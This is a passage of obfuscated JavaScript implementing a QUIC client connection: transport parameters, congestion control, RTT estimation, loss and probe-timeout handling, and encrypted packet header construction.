        return b[jK(0x997)](b[jK(0x6cd)](b['VItYP'], b[jK(0x51d)](String, c['subjectAltName'] || '')), ')');
    return null;
}
class a0cm {
    constructor(a, b, c) {
        const jM = a0d0;
        this['connection'] = a, this['id'] = b, this[jM(0x574)] = c, this[jM(0xb36)] = new a0c9(a), this[jM(0x97e)] = 0x0, this[jM(0xb64)] = Buffer['alloc'](0x0), this[jM(0x96e)] = new a0ca(), this[jM(0xce1)] = ![], this[jM(0xeba)] = ![], this['consumed'] = 0x0, this[jM(0x618)] = 0x0, this[jM(0xcd0)] = a[jM(0xb32)], this[jM(0x936)] = null;
    }
    [a0d0(0x5a6)](a, b) {
        const jN = a0d0, c = {
                'BMAdy': function (d, f) {
                    return d(f);
                }
            };
        this[jN(0xb36)]['append'](a, c['BMAdy'](Boolean, b)), this[jN(0xd12)][jN(0x940)](this);
    }
}
class a0cn {
    constructor(a) {
        const jO = a0d0, b = {
                'lJykr': function (f, g) {
                    return f(g);
                },
                'aUTJe': function (f, g) {
                    return f << g;
                },
                'iaHuR': function (f, g) {
                    return f << g;
                },
                'rAoBj': function (f, g) {
                    return f * g;
                },
                'gbutt': function (f, g) {
                    return f << g;
                },
                'xpZxH': function (f, g) {
                    return f === g;
                },
                'Pnasn': function (f, g) {
                    return f === g;
                },
                'vZIzL': function (f, g) {
                    return f === g;
                }
            }, c = jO(0xd0f)[jO(0xc0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this['kPacketThreshold'] = 0x3;
                continue;
            case '1':
                this['localParameters'] = b['lJykr'](a0ch, [
                    [
                        a0bV[jO(0xdff)],
                        this['idleTimeout']
                    ],
                    [
                        a0bV['initialMaxData'],
                        this[jO(0x50d)]
                    ],
                    [
                        a0bV[jO(0x3cd)],
                        this[jO(0xb32)]
                    ],
                    [
                        a0bV['initialMaxStreamDataBidiRemote'],
                        this[jO(0xb32)]
                    ],
                    [
                        a0bV[jO(0x35a)],
                        this[jO(0xb32)]
                    ],
                    [
                        a0bV[jO(0xd4a)],
                        b[jO(0x83f)](0x1, 0x18)
                    ],
                    [
                        a0bV[jO(0x3bf)],
                        b[jO(0x83f)](0x1, 0x18)
                    ],
                    [
                        a0bV['maxUdpPayloadSize'],
                        this[jO(0x67a)]
                    ],
                    [
                        a0bV[jO(0x1d4)],
                        0x8
                    ],
                    [
                        a0bV['initialSourceConnectionId'],
                        this['ourCid']
                    ]
                ]);
                continue;
            case '2':
                this[jO(0x877)] = a0k[jO(0x91e)](0x8);
                continue;
            case '3':
                this[jO(0xbea)] = [];
                continue;
            case '4':
                this[jO(0x51b)] = [];
                continue;
            case '5':
                this['remoteParameters'] = null;
                continue;
            case '6':
                this['peerStreamLocal'] = 0x0;
                continue;
            case '7':
                this['peerMaxData'] = 0x0;
                continue;
            case '8':
                this['closed'] = null;
                continue;
            case '9':
                this[jO(0xc3a)] = a0k[jO(0x91e)](0x8);
                continue;
            case '10':
                this['pnSend'] = [
                    0x0,
                    0x0,
                    0x0
                ];
                continue;
            case '11':
                this[jO(0x50d)] = a['localMaxData'] || b[jO(0x3f8)](0x1, 0x16);
                continue;
            case '12':
                this[jO(0x487)] = b[jO(0x6eb)](0x2, this['maxPacket']);
                continue;
            case '13':
                this['alpn'] = a[jO(0xf23)] || a0bI;
                continue;
            case '14':
                this[jO(0xc86)] = Buffer[jO(0xacf)](0x0);
                continue;
            case '15':
                this['pendingOneOff'] = [];
                continue;
            case '16':
                this['handshakeComplete'] = ![];
                continue;
            case '17':
                this['srtt'] = null;
                continue;
            case '18':
                this[jO(0x2cb)] = [];
                continue;
            case '19':
                this[jO(0xb32)] = a[jO(0xb32)] || b['gbutt'](0x1, 0x14);
                continue;
            case '20':
                this[jO(0x6b2)] = this['initialWindow'];
                continue;
            case '21':
                this[jO(0x4de)] = 0x0;
                continue;
            case '22':
                this[jO(0x39a)] = [
                    [],
                    [],
                    []
                ];
                continue;
            case '23':
                this['socket'] = null;
                continue;
            case '24':
                this[jO(0x6d5)] = ![];
                continue;
            case '25':
                this[jO(0x732)] = {
                    'rx': 0x0,
                    'tx': 0x0,
                    'rxBytes': 0x0,
                    'txBytes': 0x0,
                    'dropped': 0x0,
                    'retransmits': 0x0
                };
                continue;
            case '26':
                this[jO(0xd6a)] = a[jO(0xd6a)] || function () {
                };
                continue;
            case '27':
                this['onStream'] = a[jO(0x149)] || function () {
                };
                continue;
            case '28':
                this[jO(0x175)] = ![];
                continue;
            case '29':
                this[jO(0x97f)] = 0x0;
                continue;
            case '30':
                this[jO(0x2df)] = a[jO(0x2df)] || 0xa * this[jO(0x67a)];
                continue;
            case '31':
                this[jO(0xd91)] = [
                    -0x1,
                    -0x1,
                    -0x1
                ];
                continue;
            case '32':
                this['finishedSent'] = ![];
                continue;
            case '33':
                this[jO(0xb8d)] = 0x0;
                continue;
            case '34':
                this[jO(0x9fb)] = a['maxInflight'] || 0x100;
                continue;
            case '35':
                this[jO(0x31b)] = new a0ck(this[jO(0xafd)], this[jO(0xf23)], this[jO(0x1ad)]);
                continue;
            case '36':
                this[jO(0x1f8)] = null;
                continue;
            case '37':
                this[jO(0x446)] = Buffer['alloc'](0x0);
                continue;
            case '38':
                this[jO(0x968)] = null;
                continue;
            case '39':
                this[jO(0x8b5)] = [
                    ![],
                    ![],
                    ![]
                ];
                continue;
            case '40':
                this[jO(0x7c8)] = 0x0;
                continue;
            case '41':
                this[jO(0x30b)] = [
                    null,
                    null,
                    null
                ];
                continue;
            case '42':
                this[jO(0x25b)] = 0xfa;
                continue;
            case '43':
                this[jO(0x91b)] = [
                    new a0c9(this),
                    new a0c9(this),
                    new a0c9(this)
                ];
                continue;
            case '44':
                this['slowStartThreshold'] = Infinity;
                continue;
            case '45':
                this[jO(0x6d3)] = a[jO(0x33a)];
                continue;
            case '46':
                this[jO(0x2d9)] = [
                    new a0ca(),
                    new a0ca(),
                    new a0ca()
                ];
                continue;
            case '47':
                this[jO(0x43c)] = a['receiveWindow'] || 0x1 << 0x14;
                continue;
            case '48':
                this[jO(0x2a7)] = b['rAoBj'](this[jO(0x9fb)], this[jO(0x67a)]);
                continue;
            case '49':
                this['recvRanges'] = [
                    [],
                    [],
                    []
                ];
                continue;
            case '50':
                this[jO(0xc05)] = a[jO(0xc05)] || function () {
                };
                continue;
            case '51':
                this[jO(0x13e)] = Buffer[jO(0xacf)](0x0);
                continue;
            case '52':
                this['keepAlive'] = b[jO(0x452)](a[jO(0x136)], undefined) ? 0x3e8 : a[jO(0x136)];
                continue;
            case '53':
                this[jO(0x6c4)] = 0x0;
                continue;
            case '54':
                this[jO(0x1b5)] = b[jO(0x613)](a[jO(0x1b5)], undefined) ? 0x7530 : a['idleTimeout'];
                continue;
            case '55':
                this[jO(0x64a)] = a['onStreamEnd'] || function () {
                };
                continue;
            case '56':
                this[jO(0x606)] = a[jO(0x606)];
                continue;
            case '57':
                this[jO(0x704)] = 0x0;
                continue;
            case '58':
                this['peerStreamRemote'] = 0x0;
                continue;
            case '59':
                this[jO(0x6b1)] = null;
                continue;
            case '60':
                this[jO(0xafd)] = a[jO(0xafd)] || a[jO(0xc32)];
                continue;
            case '61':
                this[jO(0x2bf)] = [
                    null,
                    null
                ];
                continue;
            case '62':
                this[jO(0x5f1)] = 0x0;
                continue;
            case '63':
                this[jO(0x67a)] = a['maxPacket'] || a0bO;
                continue;
            case '64':
                this[jO(0xdc3)] = ![];
                continue;
            case '65':
                this['verifyCertificate'] = b[jO(0x774)](a[jO(0x54f)], !![]);
                continue;
            case '66':
                this[jO(0x930)] = null;
                continue;
            case '67':
                this[jO(0xc32)] = a[jO(0xc32)];
                continue;
            case '68':
                this['creditMaxData'] = ![];
                continue;
            case '69':
                this[jO(0xca0)] = 0x0;
                continue;
            case '70':
                this[jO(0xae9)] = ![];
                continue;
            case '71':
                this['confirmed'] = ![];
                continue;
            case '72':
                this['streams'] = new Map();
                continue;
            case '73':
                this['peerMaxAckDelay'] = 0x19;
                continue;
            case '74':
                this[jO(0x71c)] = 0x0;
                continue;
            case '75':
                this[jO(0xf27)] = a['onStreamData'] || function () {
                };
                continue;
            case '76':
                this[jO(0xd5d)] = ![];
                continue;
            }
            break;
        }
    }
    get [a0d0(0x240)]() {
        const jP = a0d0, a = {
                'cmlPV': function (b, c) {
                    return b === c;
                }
            };
        return a[jP(0xe45)](this[jP(0x6d5)], !![]);
    }
    set [a0d0(0x240)](a) {
        const jQ = a0d0, b = {
                'fhrjR': function (c, d) {
                    return c === d;
                }
            };
        this[jQ(0x6d5)] = b[jQ(0x6d8)](a, !![]), this[jQ(0x6d5)] && !this['closed'] && !this[jQ(0xd5d)] && this[jQ(0xd81)](jQ(0x665));
    }
    [a0d0(0xdf8)]() {
        const jR = a0d0, a = {
                'kmuTW': jR(0x5a9),
                'OypDM': jR(0x192),
                'mtWtp': jR(0xcc9),
                'bBhjs': jR(0xf18),
                'eyOeI': jR(0x755)
            };
        return new Promise((b, c) => {
            const jS = jR, d = { 'ieKYb': a[jS(0x337)] };
            this[jS(0x1f8)] = {
                'resolve': b,
                'reject': c
            }, this[jS(0x274)] = a0az[jS(0x666)](a[jS(0x1ce)]), this['socket']['on'](a[jS(0x145)], f => {
                const jT = jS;
                try {
                    this[jT(0xbca)](f);
                } catch (g) {
                    this[jT(0x2c1)](d[jT(0xa6e)] + g);
                }
            }), this['socket']['on'](a[jS(0x2e7)], f => {
                const jU = jS;
                !this[jU(0x85c)] && this[jU(0x2c1)](a[jU(0x95a)] + f[jU(0xf18)]);
            }), this[jS(0x274)][jS(0x82e)](0x0, jS(0x8f0), () => this['_start']());
        });
    }
    [a0d0(0x81a)]() {
        const jV = a0d0, a = {
                'bPUBE': function (d, f, g) {
                    return d(f, g);
                },
                'MYzmA': function (d, f) {
                    return d + f;
                },
                'Eddns': function (d, f) {
                    return d + f;
                },
                'OXxQm': jV(0x31c),
                'OXNnu': jV(0xd70),
                'Fivla': jV(0x5fe),
                'HVDRR': 'hex'
            }, b = jV(0x8e4)[jV(0xc0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[jV(0x968)] = a[jV(0xc2e)](setInterval, () => this[jV(0xd24)](), 0x14);
                continue;
            case '1':
                this[jV(0xb8d)] = Date[jV(0x430)]();
                continue;
            case '2':
                this[jV(0xd24)]();
                continue;
            case '3':
                this[jV(0x4de)] = Date[jV(0x430)]();
                continue;
            case '4':
                this[jV(0x30b)][a0bQ] = a[jV(0xc2e)](a0c6, this['peerCid'], !![]);
                continue;
            case '5':
                this['log']['debug'](a[jV(0x4af)](a[jV(0x16c)](a['MYzmA'](a['OXxQm'] + this[jV(0xc32)] + ':' + this['port'], a[jV(0x7e9)]), this[jV(0xf23)]) + a['Fivla'], this[jV(0xc3a)]['toString'](a['HVDRR'])));
                continue;
            case '6':
                this[jV(0x91b)][a0bQ][jV(0x63d)](this['tls'][jV(0xd63)](), ![]);
                continue;
            }
            break;
        }
    }
    [a0d0(0xd24)]() {
        const jW = a0d0, a = {
                'AISVo': function (d, f) {
                    return d >= f;
                },
                'vfIQg': function (d, f) {
                    return d - f;
                },
                'BAGOl': function (d, f) {
                    return d < f;
                },
                'qOQlM': function (d, f) {
                    return d === f;
                },
                'FQXxG': function (d, f) {
                    return d > f;
                },
                'RGYVL': 'peer\x20idle\x20for\x20'
            };
        if (this[jW(0x85c)])
            return;
        const b = Date[jW(0x430)]();
        this[jW(0xeea)](b);
        this['keepAlive'] && this[jW(0x712)] && a['AISVo'](a['vfIQg'](b, this[jW(0x4de)]), this['keepAlive']) && (this[jW(0xae9)] = !![]);
        let c = 0x0;
        while (a[jW(0x9c8)](c, 0x10) && a[jW(0x9c8)](this[jW(0x6fc)](), this[jW(0x9fb)]) && (this[jW(0xb1e)]() < this[jW(0xa0e)]() || this[jW(0xdc6)]() || this[jW(0xd5d)])) {
            const d = this[jW(0x380)]();
            if (a[jW(0x224)](d, null))
                break;
            this['_transmit'](d), c += 0x1;
        }
        a[jW(0xdf3)](a[jW(0x5c2)](b, this[jW(0xb8d)]), Math[jW(0x8b4)](this[jW(0x1b5)], 0x3a98)) && this['_fail'](a['RGYVL'] + a['vfIQg'](b, this['lastReceived']) + 'ms');
    }
    [a0d0(0x6fc)]() {
        const jX = a0d0;
        return this[jX(0x39a)][0x0][jX(0x615)] + this[jX(0x39a)][0x1][jX(0x615)] + this[jX(0x39a)][0x2]['length'];
    }
    [a0d0(0xdc6)]() {
        const jY = a0d0, a = {
                'YoVET': function (b, c) {
                    return b < c;
                },
                'edMYZ': function (b, c) {
                    return b !== c;
                }
            };
        for (let b = 0x0; a[jY(0x833)](b, 0x3); b++) {
            if (a[jY(0xd2)](this[jY(0x30b)][b], null) && this[jY(0x8b5)][b] && this[jY(0xa4e)][b]['length'])
                return !![];
        }
        return ![];
    }
    [a0d0(0xb1e)]() {
        const jZ = a0d0, a = {
                'KXjbO': function (c, d) {
                    return c < d;
                }
            };
        let b = 0x0;
        for (let c = 0x0; a[jZ(0x294)](c, 0x3); c++) {
            for (const d of this[jZ(0x39a)][c]) {
                b += d[jZ(0xf2c)];
            }
        }
        return b;
    }
    [a0d0(0xa0e)]() {
        const k0 = a0d0;
        return this['handshakeComplete'] ? this[k0(0x6b2)] : Infinity;
    }
    [a0d0(0x6f5)]() {
        const k1 = a0d0, a = {
                'NqFKX': function (b, c) {
                    return b * c;
                }
            };
        return Math[k1(0x8b4)](a[k1(0x1cc)](this[k1(0x25b)], Math[k1(0x938)](0x2, this[k1(0xca0)])), 0x14);
    }
    [a0d0(0xd66)](a) {
        const k2 = a0d0, b = {
                'IRNbE': function (c, d) {
                    return c === d;
                },
                'yPCmC': function (c, d) {
                    return c / d;
                },
                'wAxMN': function (c, d) {
                    return c / d;
                },
                'YFDaF': function (c, d) {
                    return c + d;
                },
                'TuJII': function (c, d) {
                    return c * d;
                },
                'YavyJ': function (c, d) {
                    return c - d;
                },
                'hgyUc': function (c, d) {
                    return c / d;
                },
                'XcVFG': function (c, d) {
                    return c * d;
                },
                'yBJZd': function (c, d) {
                    return c + d;
                },
                'wmUMT': function (c, d) {
                    return c * d;
                }
            };
        b['IRNbE'](this[k2(0x474)], null) ? (this[k2(0x474)] = a, this[k2(0x930)] = b['yPCmC'](a, 0x2)) : (this[k2(0x930)] = b[k2(0xe63)](b[k2(0xd56)](b[k2(0xa12)](this['rttvar'], 0x3), Math[k2(0x113)](b['YavyJ'](this[k2(0x474)], a))), 0x4), this[k2(0x474)] = b[k2(0xac4)](b['YFDaF'](b['XcVFG'](this[k2(0x474)], 0x7), a), 0x8)), this[k2(0x25b)] = Math[k2(0x7f3)](b[k2(0xf2)](this[k2(0x474)], b[k2(0x96f)](0x4, this[k2(0x930)])) + this[k2(0xf12)]);
    }
    [a0d0(0x637)](a) {
        const k3 = a0d0, b = {
                'bdOHW': function (c, d) {
                    return c / d;
                },
                'pnwVV': function (c, d) {
                    return c * d;
                },
                'IgULu': function (c, d) {
                    return c + d;
                },
                'cBcXD': function (c, d) {
                    return c + d;
                },
                'Gupcs': function (c, d) {
                    return c + d;
                },
                'MFetN': function (c, d) {
                    return c + d;
                },
                'raTBJ': 'quic\x20loss\x20epoch=',
                'GtDGH': k3(0xe03),
                'pfkbs': '\x20ssthresh=',
                'LHRXO': function (c, d) {
                    return c === d;
                }
            };
        this['slowStartThreshold'] = Math[k3(0x8b4)](Math[k3(0x69d)](b[k3(0xdf7)](this['congestionWindow'], 0x2)), b[k3(0x53c)](0x2, this['minWindow'])), this[k3(0x6b2)] = this[k3(0x487)], this[k3(0x6d3)][k3(0xb89)](b[k3(0x7cf)](b[k3(0x7cf)](b[k3(0xee0)](b['Gupcs'](b[k3(0x3ed)](b[k3(0x1a0)] + a0bT[a] + b[k3(0x906)], this['congestionWindow']), b[k3(0x2ad)]) + this[k3(0xab5)], k3(0xb1b)), b['LHRXO'](this[k3(0x474)], null) ? '-' : Math['round'](this[k3(0x474)])), 'ms'));
    }
    [a0d0(0xeea)](a) {
        const k4 = a0d0, b = {
                'ohzkZ': function (c, d) {
                    return c - d;
                },
                'shasE': function (c, d) {
                    return c + d;
                },
                'Cnpbc': function (c, d) {
                    return c + d;
                },
                'ipCfW': function (c, d) {
                    return c + d;
                },
                'MgNdq': function (c, d) {
                    return c + d;
                },
                'yHvLy': k4(0x117),
                'vbOfR': k4(0x43d),
                'aMFSs': k4(0x64f),
                'dQQxe': '\x20pto=',
                'hWgWV': function (c, d) {
                    return c > d;
                },
                'KUVyS': '\x20retransmits'
            };
        for (let c = 0x0; c < 0x3; c++) {
            const d = this[k4(0x39a)][c];
            if (!d[k4(0x615)])
                continue;
            if (b[k4(0xc38)](a, d[0x0][k4(0xb38)]) < this[k4(0x6f5)]())
                continue;
            const f = d[0x0];
            this[k4(0x39a)][c] = d['slice'](0x1), this[k4(0xcdf)](c, f), this[k4(0x6c4)] += 0x1, this[k4(0x732)][k4(0x6c4)] += 0x1, this['ptoCount'] += 0x1, this[k4(0x6d3)][k4(0xb89)](b['shasE'](b['Cnpbc'](b[k4(0x864)](b['MgNdq'](b['yHvLy'], a0bT[c]), b['vbOfR']) + f['pn'] + b[k4(0x568)], this[k4(0x39a)][c][k4(0x615)]), b[k4(0xbe8)]) + this['_ptoDuration']());
            if (b[k4(0xd0d)](this[k4(0x6c4)], 0x18)) {
                this['_fail'](b[k4(0x2fe)](b[k4(0xf22)](k4(0xe26), this[k4(0x6c4)]), b[k4(0x259)]));
                return;
            }
        }
    }
    ['_returnLost'](a, b) {
        const k5 = a0d0;
        b[k5(0x53b)] && this[k5(0x91b)][a][k5(0x506)]([b[k5(0x53b)]]);
        for (const c of b[k5(0x315)]) {
            c[k5(0xe12)][k5(0xb36)][k5(0x506)]([{
                    'start': c[k5(0xb58)],
                    'length': c[k5(0x615)]
                }]), c['fin'] && c[k5(0xe12)][k5(0xb36)][k5(0x506)]([{
                    'start': c[k5(0xb58)] + c[k5(0x615)],
                    'length': 0x0,
                    'fin': !![]
                }]), this[k5(0x940)](c['stream']);
        }
    }
    [a0d0(0x312)]() {
        const k6 = a0d0;
        this[k6(0x6c4)] = 0x0, this['ptoCount'] = 0x0;
    }
    [a0d0(0x326)](a, b) {
        const k7 = a0d0, c = {
                'lFgZg': function (d, f) {
                    return d === f;
                },
                'iJkeR': function (d, f) {
                    return d + f;
                },
                'FTjrq': k7(0x97c)
            };
        if (c[k7(0x882)](this[k7(0x30b)][a], null))
            return;
        this[k7(0x30b)][a] = null, this[k7(0x39a)][a] = [], this['log'][k7(0xb89)](c[k7(0xeff)](c[k7(0xeff)](c[k7(0xeff)](k7(0xe35), a0bT[a]), c[k7(0x98d)]), b) + ')');
    }
    [a0d0(0xb34)]() {
        const k8 = a0d0, a = {
                'fuGxL': function (k, l) {
                    return k === l;
                },
                'vbyFq': function (k, l) {
                    return k + l;
                },
                'chsTx': function (k, l, m, n, o) {
                    return k(l, m, n, o);
                }
            }, b = a0bR, c = this['keys'][b];
        if (a[k8(0x987)](c, null) || !this['ackPending'][b] || a['fuGxL'](this[k8(0xa4e)][b][k8(0x615)], 0x0))
            return;
        const d = a0ce(this[k8(0xa4e)][b][k8(0x174)](-0x10));
        this[k8(0x8b5)][b] = ![];
        const f = this['pnSend'][b]++, g = this['_header'](b, a[k8(0x421)](a0bN, d[k8(0x615)]) + 0x10, f), h = Buffer[k8(0x7b6)]([
                g[k8(0x404)],
                g[k8(0xaea)]
            ]), i = Buffer[k8(0x7b6)]([
                h,
                c[k8(0xb36)][k8(0x8a5)](f, h, d)
            ]), j = a['chsTx'](a0cb, c[k8(0xb36)], i, g['pnOffset'], g[k8(0xd47)]);
        if (a[k8(0x987)](j, null)) {
            this[k8(0x8b5)][b] = !![];
            return;
        }
        this[k8(0xc17)]({
            'epoch': b,
            'packet': j,
            'pn': f,
            'meta': {
                'crypto': null,
                'streams': []
            },
            'ackEliciting': ![]
        });
    }
    ['_confirmHandshake']() {
        const k9 = a0d0, a = { 'KTSUI': 'handshake\x20confirmed' }, b = '0|4|2|3|1'[k9(0xc0)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                if (this[k9(0x20c)] || !this[k9(0x712)] || !this[k9(0xae7)])
                    return;
                continue;
            case '1':
                this[k9(0x326)](a0bQ, k9(0xeb6));
                continue;
            case '2':
                this[k9(0x20c)] = !![];
                continue;
            case '3':
                this['_discardEpoch'](a0bR, a[k9(0xf2d)]);
                continue;
            case '4':
                this['_flushHandshakeAck']();
                continue;
            }
            break;
        }
    }
    [a0d0(0x46c)](a) {
        const ka = a0d0, b = {
                'STUun': function (d, f) {
                    return d === f;
                },
                'xZRKZ': function (d, f) {
                    return d + f;
                },
                'eJVMO': function (d, f) {
                    return d + f;
                },
                'IHTBz': function (d, f) {
                    return d + f;
                },
                'ExWTm': function (d, f) {
                    return d + f;
                },
                'MpGzh': function (d, f) {
                    return d(f);
                }
            }, c = 0x10;
        if (b[ka(0x3bb)](a, a0bS))
            return b[ka(0xea7)](0x1 + this[ka(0xc3a)][ka(0x615)], a0bN) + c;
        if (b[ka(0x3bb)](a, a0bR))
            return b[ka(0xea7)](b[ka(0xea7)](b[ka(0xea7)](b[ka(0xea7)](b[ka(0xea7)](b[ka(0xea7)](b['xZRKZ'](b[ka(0xea7)](0x1, 0x4), 0x1), this[ka(0xc3a)]['length']), 0x1), this[ka(0x877)][ka(0x615)]), 0x2), a0bN), c);
        return b[ka(0x394)](b[ka(0x394)](b[ka(0x116)](b[ka(0xa68)](b[ka(0xea7)](b[ka(0xea7)](0x1 + 0x4, 0x1), this[ka(0xc3a)][ka(0x615)]), 0x1) + this[ka(0x877)][ka(0x615)], b[ka(0xdcf)](a0bW, this[ka(0xc86)][ka(0x615)])), this[ka(0xc86)][ka(0x615)]) + 0x2, a0bN) + c;
    }
    [a0d0(0xe40)](a, b, c) {
        const kb = a0d0, d = {
                'rGTdC': function (k, l) {
                    return k >>> l;
                },
                'Nonrq': function (k, l) {
                    return k | l;
                },
                'ybYNM': function (k, l) {
                    return k - l;
                },
                'GlYlA': function (k, l) {
                    return k === l;
                },
                'EecDe': function (k, l) {
                    return k | l;
                },
                'VtJjq': function (k, l) {
                    return k << l;
                },
                'xuupa': function (k, l) {
                    return k === l;
                }
            }, f = new a0bZ(), g = Buffer['alloc'](a0bN);
        g[kb(0x16d)](d[kb(0x693)](c, 0x0), 0x0);
        if (a === a0bS)
            return f[kb(0xc43)](d[kb(0xcbe)](0x40 | this['appKeyPhase'] << 0x2, d[kb(0xeb0)](a0bN, 0x1))), f[kb(0xf2c)](this[kb(0xc3a)]), {
                'header': f[kb(0x796)](),
                'pnBytes': g,
                'pnOffset': 0x1 + this[kb(0xc3a)][kb(0x615)],
                'long': ![]
            };
        const h = d['GlYlA'](a, a0bQ) ? 0x0 : 0x2;
        f[kb(0xc43)](d[kb(0xcbe)](d['EecDe'](0xc0, d['VtJjq'](h, 0x4)), d[kb(0xeb0)](a0bN, 0x1))), f[kb(0x22a)](a0bH), f[kb(0xc43)](this['peerCid'][kb(0x615)])['bytes'](this[kb(0xc3a)]);
        d['xuupa'](a, a0bQ) ? (f[kb(0xc43)](this[kb(0x877)][kb(0x615)])[kb(0xf2c)](this[kb(0x877)]), f[kb(0xb61)](this[kb(0xc86)][kb(0x615)]), this[kb(0xc86)][kb(0x615)] && f[kb(0xf2c)](this[kb(0xc86)])) : f[kb(0xc43)](0x0)['bytes'](Buffer[kb(0xacf)](0x0));
        const i = Buffer['alloc'](0x2);
        i[kb(0x948)](0x4000 | b, 0x0), f[kb(0xf2c)](i);
        const j = f[kb(0x796)]();
        return {
            'header': j,
            'pnBytes': g,
            'pnOffset': j[kb(0x615)],
            'long': !![]
        };
    }
    ['_pickEpoch']() {
        const kc = a0d0, a = {
                'DommF': function (b, c) {
                    return b === c;
                },
                'xTAtH': function (b, c) {
                    return b === c;
                }
            };
        for (const b of [
                a0bQ,
                a0bR,
                a0bS
            ]) {
            if (a[kc(0x621)](this[kc(0x30b)][b], null))
                continue;
            if (this[kc(0x8b5)][b] && this[kc(0xa4e)][b][kc(0x615)])
                return b;
            if (this[kc(0xafa)](b)['length'])
                return b;
            if (this[kc(0x91b)][b][kc(0x339)][kc(0x615)])
                return b;
            if (a[kc(0x3d5)](b, a0bS) && (this[kc(0xbea)][kc(0x615)] || this[kc(0x51b)][kc(0x615)] || this[kc(0xae9)] || this['closing']))
                return b;
        }
        return -0x1;
    }
    [a0d0(0xafa)](a) {
        const kd = a0d0;
        return this['pendingOneOff'][kd(0x74d)](b => b[kd(0xaa7)] === a);
    }
    [a0d0(0x380)]() {
        const ke = a0d0, a = {
                'LetQX': function (o, p) {
                    return o < p;
                },
                'CAggc': function (o, p) {
                    return o - p;
                },
                'DiRYm': function (o, p) {
                    return o(p);
                },
                'YXFRI': function (o, p) {
                    return o > p;
                },
                'TCpXR': function (o, p) {
                    return o - p;
                },
                'KcCHY': function (o, p) {
                    return o === p;
                },
                'XpwOh': ke(0xd81),
                'vKkSY': 'utf8',
                'qGowA': function (o, p) {
                    return o + p;
                },
                'oLLqb': function (o, p, q, r, s) {
                    return o(p, q, r, s);
                },
                'GTmEp': ke(0x212),
                'MZcue': function (o, p) {
                    return o(p);
                }
            }, b = this[ke(0xe69)]();
        if (a['LetQX'](b, 0x0))
            return null;
        let c = a[ke(0x460)](this[ke(0x67a)], this['_headerOverhead'](b));
        if (a[ke(0x71e)](c, 0x10))
            return null;
        const d = [], f = {
                'crypto': null,
                'streams': [],
                'ping': ![],
                'closing': ![],
                'oneOff': ![]
            };
        if (this['ackPending'][b] && this[ke(0xa4e)][b][ke(0x615)]) {
            const o = a[ke(0x92c)](a0ce, this[ke(0xa4e)][b][ke(0x174)](-0x10));
            d[ke(0x59a)](o), c -= o[ke(0x615)], this['ackPending'][b] = ![];
        }
        for (const p of this[ke(0xafa)](b)) {
            if (a[ke(0x78f)](p[ke(0x32b)]['length'], c - 0x10))
                break;
            d[ke(0x59a)](p[ke(0x32b)]), c -= p['frame'][ke(0x615)], this['pendingOneOff'][ke(0x918)](this[ke(0x362)]['indexOf'](p), 0x1), f[ke(0x35f)] = !![];
        }
        const g = this[ke(0x91b)][b];
        if (g['pending'][ke(0x615)] && c > 0x10) {
            const q = g[ke(0x548)](a[ke(0x7e2)](c, 0xc)), r = new a0bZ();
            r[ke(0xc43)](a0bU[ke(0x53b)])['varint'](q[ke(0xb58)])[ke(0xb61)](q[ke(0x615)])['bytes'](q[ke(0xf2c)]);
            const s = r['build']();
            d[ke(0x59a)](s), c -= s[ke(0x615)], f[ke(0x53b)] = q;
        }
        a[ke(0x565)](b, a0bS) && (this[ke(0x8bc)](d, f, c), this['_streamFrames'](d, f, Math[ke(0xb66)](c, a[ke(0x7e2)](this[ke(0xa0e)](), this[ke(0xb1e)]()))));
        if (b === a0bS && this['closing']) {
            const t = new a0bZ();
            t[ke(0xc43)](a0bU[ke(0x4ee)])['varint'](0x0)['varint'](0x0)[ke(0xf2c)](Buffer[ke(0x58d)](this[ke(0x6b1)] || a[ke(0xcf2)], a[ke(0x39b)])[ke(0x3d1)](0x0, 0x40)), d['push'](t[ke(0x796)]()), f[ke(0xd5d)] = !![];
        } else
            b === a0bS && this[ke(0xae9)] && (d[ke(0x59a)](Buffer[ke(0x58d)]([a0bU[ke(0x75b)]])), this['pingPending'] = ![], f[ke(0x75b)] = !![]);
        if (!d[ke(0x615)])
            return null;
        let h = Buffer['concat'](d);
        if (b === a0bQ && !this['handshakeComplete']) {
            const u = a[ke(0x460)](a[ke(0x7e2)](a0bP, this[ke(0x46c)](b)), h[ke(0x615)]);
            a[ke(0x78f)](u, 0x0) && (h = Buffer[ke(0x7b6)]([
                h,
                Buffer['alloc'](u)
            ]));
        }
        const i = this[ke(0x659)][b]++, j = b === a0bS ? this['appSendKeys'][this[ke(0x704)]] : this[ke(0x30b)][b][ke(0xb36)], k = this[ke(0xe40)](b, a[ke(0x935)](a['qGowA'](a0bN, h[ke(0x615)]), 0x10), i), l = Buffer[ke(0x7b6)]([
                k[ke(0x404)],
                k[ke(0xaea)]
            ]), m = Buffer[ke(0x7b6)]([
                l,
                j[ke(0x8a5)](i, l, h)
            ]), n = a[ke(0xd11)](a0cb, j, m, k[ke(0xaeb)], k[ke(0xd47)]);
        if (n === null)
            return this[ke(0x2c1)](a[ke(0xa07)]), null;
        return {
            'epoch': b,
            'packet': n,
            'pn': i,
            'meta': f,
            'ackEliciting': a[ke(0x85e)](Boolean, f['crypto'] || f['streams'][ke(0x615)] || f['ping'] || f[ke(0xd5d)] || f[ke(0x35f)]),
            'summary': this['_frameSummary'](d)
        };
    }
    [a0d0(0x3c4)](a) {
        const kf = a0d0, b = {
                'poZti': function (d, f) {
                    return d === f;
                },
                'aTpSa': 'ack',
                'XeiFn': function (d, f) {
                    return d === f;
                },
                'PfTVB': kf(0x53b),
                'yWWfz': kf(0x75b),
                'cuWSc': 'stream',
                'qlGJh': function (d, f) {
                    return d === f;
                },
                'ClOpb': kf(0x639),
                'INNca': function (d, f) {
                    return d === f;
                },
                'SIZkE': kf(0xe02),
                'NQncv': kf(0x388),
                'PgxkC': function (d, f) {
                    return d + f;
                }
            }, c = [];
        for (const d of a) {
            const f = d[0x0];
            if (b[kf(0x89e)](f, a0bU[kf(0xaca)]))
                c[kf(0x59a)](b[kf(0x378)]);
            else {
                if (b[kf(0x839)](f, a0bU[kf(0x53b)]))
                    c['push'](b['PfTVB']);
                else {
                    if (b[kf(0x89e)](f, a0bU['ping']))
                        c[kf(0x59a)](b[kf(0xc6)]);
                    else {
                        if (b['poZti'](f, a0bU[kf(0xe12)]))
                            c['push'](b[kf(0x458)]);
                        else {
